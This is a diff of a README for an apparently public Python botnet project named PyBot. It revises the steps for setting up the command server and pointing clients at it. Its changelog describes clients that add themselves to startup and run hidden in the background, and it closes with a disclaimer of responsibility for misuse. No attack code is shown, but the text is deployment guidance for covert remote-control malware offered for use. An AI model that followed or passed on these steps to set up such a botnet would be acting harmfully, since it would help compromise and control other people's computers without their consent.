@@ -11,13 +11,18 @@ A Python botnet script with a remote control system to clients with an included 
 
 
 # For windows;
-- Port forward / or test locally
+- Port forward / test locally
 - find your IP address
 - put your Server's IP address into this cool box (it should be the one you just looked up)
 ![image](https://github.com/DABOSS2016YT/PyBot/assets/43446532/4af538a2-12dc-4619-8dbf-e1f20dbed3fe)
 - run the client and it should appear when you type "list"
 
-## for other systems scroll down
+#for other systems
+- port forward / test locally
+- find your IP
+- replace this variable with your IP
+https://github.com/DABOSS2016YT/PyBot/blob/4726790373c0c146fae0b39cf975cabd7645f3e6/Other%20System/Client2.0.py#L15
+- check for connections using list
 
 
 # Changelogs
@@ -39,7 +44,6 @@ A Python botnet script with a remote control system to clients with an included 
 * Start.py adds the client to the startup
 * on startup client now runs in the background
 
-# Replace this with your IP address https://github.com/DABOSS2016YT/PyBot/blob/0df3af875e74bc18c6871b94846af487b5a7960a/botnet/Client2.0.py#L278
 
 # NOTE
 * I'm not responsible for what you do with this
